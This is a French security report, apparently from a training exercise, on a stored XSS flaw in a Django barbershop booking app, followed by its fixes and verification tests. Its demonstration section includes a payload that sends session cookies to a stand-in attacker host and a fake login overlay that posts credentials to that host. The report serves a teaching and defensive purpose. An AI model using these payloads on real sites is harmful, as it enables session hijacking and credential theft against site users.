# Rapport XSS — BarberWeb

**OWASP 2025 :** A03 – Injection
**CWE :** CWE-79 – Cross-Site Scripting (XSS)
**Sous-type :** Stored XSS (persistant)
**Framework :** Django 5.1 / SQLite

---

## 1. Fichiers vulnérables identifiés

| Fichier | Ligne | Nature de la vulnérabilité |
|---------|-------|---------------------------|
| `blog/templates/blog/index.html` | 59 | `{{ appt.notes\|safe }}` — le filtre `\|safe` désactive l'auto-échappement Django ; tout HTML/JS stocké est rendu tel quel |
| `blog/templates/blog/index.html` | 76 | `{{ appt.notes\|default:'' }}` dans un attribut `onclick` avec template literal JS — vecteur secondaire si notes contient des backticks ou `</script>` |
| `blog/static/blog/js/barber.js` | 70 | `notesTd.innerHTML = appointment.notes` — utilisation de `innerHTML` côté JS pour le rendu AJAX ; exécute le HTML brut retourné par l'API |
| `blog/forms.py` | — | Absence de méthode `clean_notes()` — les notes sont enregistrées sans aucune validation ni sanitisation du contenu HTML |
| `mysite/settings.py` | — | Absence de Content Security Policy (CSP) — aucun header HTTP n'empêche l'exécution de scripts inline ou externes |

---

## 2. Flow de l'attaque

```
[Attaquant]
    │
    │  1. Remplit le formulaire "Ajouter un rendez-vous"
    │     Champ "Commentaires" = payload XSS (ex: <script>alert(1)</script>)
    │
    ▼
[Django — views.py → forms.py]
    │
    │  2. AppointmentForm.is_valid() retourne True
    │     Aucun clean_notes() → le payload n'est pas filtré
    │
    ▼
[Base de données SQLite — table blog_appointment]
    │
    │  3. Le payload est stocké tel quel dans la colonne "notes"
    │     Tous les visiteurs futurs sont exposés
    │
    ▼
[Navigateur de la victime — admin ou client]
    │
    │  4a. Chargement SSR (Django template) :
    │      {{ appt.notes|safe }} → le HTML est injecté dans la page sans échappement
    │
    │  4b. Chargement AJAX (bouton "Filtrer") :
    │      L'API /api/appointments/ retourne les notes en JSON
    │      barber.js utilise innerHTML → le script s'exécute
    │
    ▼
[Script exécuté dans le navigateur victime]
    │
    │  → Vol de cookie, phishing, keylogging, redirection...
    │  → L'attaquant reçoit les données sur son serveur (attaquant.local)
```

---

## 3. Scripts de démonstration

### `demo_xss/attaque_basique.js`

**Payload :** `<script>alert('XSS — BarberWeb compromis !')</script>`

**Ce qu'il fait :** Affiche une popup JavaScript dans le navigateur de chaque visiteur.
**Champ ciblé :** Commentaires (formulaire "Ajouter un rendez-vous")
**Effet visible :** Popup modale bloquante — preuve irréfutable d'exécution de code arbitraire.
**Valeur pédagogique :** Démontre la faille sans causer de dommages réels.

---

### `demo_xss/attaque_session.js`

**Payload :** `<script>new Image().src='http://attaquant.local/steal?cookie='+encodeURIComponent(document.cookie);</script>`

**Ce qu'il fait :** Lit `document.cookie` et l'envoie vers un serveur attaquant via une requête image invisible.
**Champ ciblé :** Commentaires
**Effet visible :** Requête GET visible dans l'onglet Réseau des DevTools, avec `sessionid=...` en paramètre.
**Impact réel :** L'attaquant récupère le cookie de session Django → usurpation de compte sans mot de passe (session hijacking).

---

### `demo_xss/attaque_phishing.js`

**Payload :** Voir fichier — injecte un `<div>` overlay plein écran avec faux formulaire de login.

**Ce qu'il fait :** Remplace visuellement toute la page par un écran "Session expirée" avec un formulaire qui envoie les credentials vers `http://attaquant.local/capture`.
**Champ ciblé :** Commentaires
**Effet visible :** L'interface BarberWeb disparaît, remplacée par un faux écran de connexion.
**Impact réel :** L'admin saisit son vrai mot de passe Django, qui est intercepté en clair.

---

## 4. Corrections appliquées

### `blog/templates/blog/index.html` — Suppression de `|safe`

| | Vulnérable | Corrigé |
|---|---|---|
| Code | `{{ appt.notes\|safe }}` | `{{ appt.notes }}` |
| Effet | Rendu HTML brut | Auto-échappement Django (`&lt;script&gt;`) |

**Pourquoi :** Le filtre `|safe` est la cause principale. Sans lui, Django convertit automatiquement `<` en `&lt;`, `>` en `&gt;`, rendant le payload inoffensif.

---

### `blog/static/blog/js/barber.js` — `innerHTML` → `textContent`

| | Vulnérable | Corrigé |
|---|---|---|
| Code | `notesTd.innerHTML = appointment.notes` | `notesTd.textContent = appointment.notes` |
| Effet | Parse et exécute le HTML | Traite comme texte brut |

**Pourquoi :** `innerHTML` demande au navigateur d'interpréter le contenu comme du HTML. `textContent` l'affiche comme une chaîne de caractères sans parsing — les balises `<script>` apparaissent telles quelles à l'écran.

---

### `blog/forms.py` — Ajout de `clean_notes()` avec `bleach`

```python
def clean_notes(self):
    import bleach
    notes = self.cleaned_data.get("notes", "")
    return bleach.clean(notes, tags=[], strip=True)  # FIX XSS — supprime toutes les balises
```

**Pourquoi :** `bleach.clean()` avec `tags=[]` supprime toutes les balises HTML avant la sauvegarde en base. Même si le template réintroduisait `|safe`, la donnée en base serait déjà nettoyée.

---

### `mysite/settings.py` — Content Security Policy

```python
# Dans INSTALLED_APPS : 'csp'
# Dans MIDDLEWARE : 'csp.middleware.CSPMiddleware'

CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC  = ("'self'",)   # bloque les scripts inline et les scripts externes
CSP_STYLE_SRC   = ("'self'",)
CSP_IMG_SRC     = ("'self'", "data:")

SECURE_CONTENT_TYPE_NOSNIFF = True  # X-Content-Type-Options: nosniff
X_FRAME_OPTIONS = 'DENY'            # X-Frame-Options: DENY (clickjacking)
```

**Pourquoi :** La CSP est une défense en profondeur. Même si un payload XSS passe la validation, le navigateur refuse d'exécuter les scripts inline ou de charger des ressources depuis des domaines non autorisés — `attaquant.local` est bloqué.

---

## 5. Vérification

### Tester que la faille est bien fermée

**Test 1 — Template Django :**
1. Appliquer la correction (`{{ appt.notes }}` sans `|safe`)
2. Ajouter un rendez-vous avec `<script>alert(1)</script>` dans les commentaires
3. Recharger la page
4. Résultat attendu : `<script>alert(1)</script>` s'affiche comme du **texte** — aucune popup

**Test 2 — AJAX (barber.js) :**
1. Appliquer la correction (`textContent` au lieu de `innerHTML`)
2. Cliquer "Filtrer" après avoir injecté le payload
3. Résultat attendu : le texte brut du payload s'affiche dans le tableau — aucune exécution

**Test 3 — Validation formulaire :**
1. Activer `clean_notes()` dans `forms.py` (décommenter)
2. Installer bleach : `pip install bleach`
3. Soumettre `<script>alert(1)</script>` dans les commentaires
4. Vérifier en base : `python manage.py shell` → `Appointment.objects.last().notes`
5. Résultat attendu : `alert(1)` (les balises ont été supprimées par bleach)

**Test 4 — Headers HTTP (après activation CSP) :**
```bash
curl -I http://localhost:8000/ | grep -i "content-security-policy"
# Résultat attendu : Content-Security-Policy: default-src 'self'; ...
```

**Test 5 — Vérification automatique DevTools :**
- Ouvrir l'onglet Console après correction
- Injecter le payload de vol de cookie
- Résultat attendu : erreur CSP dans la console — `Refused to load image 'http://attaquant.local/...' because it violates the Content Security Policy`
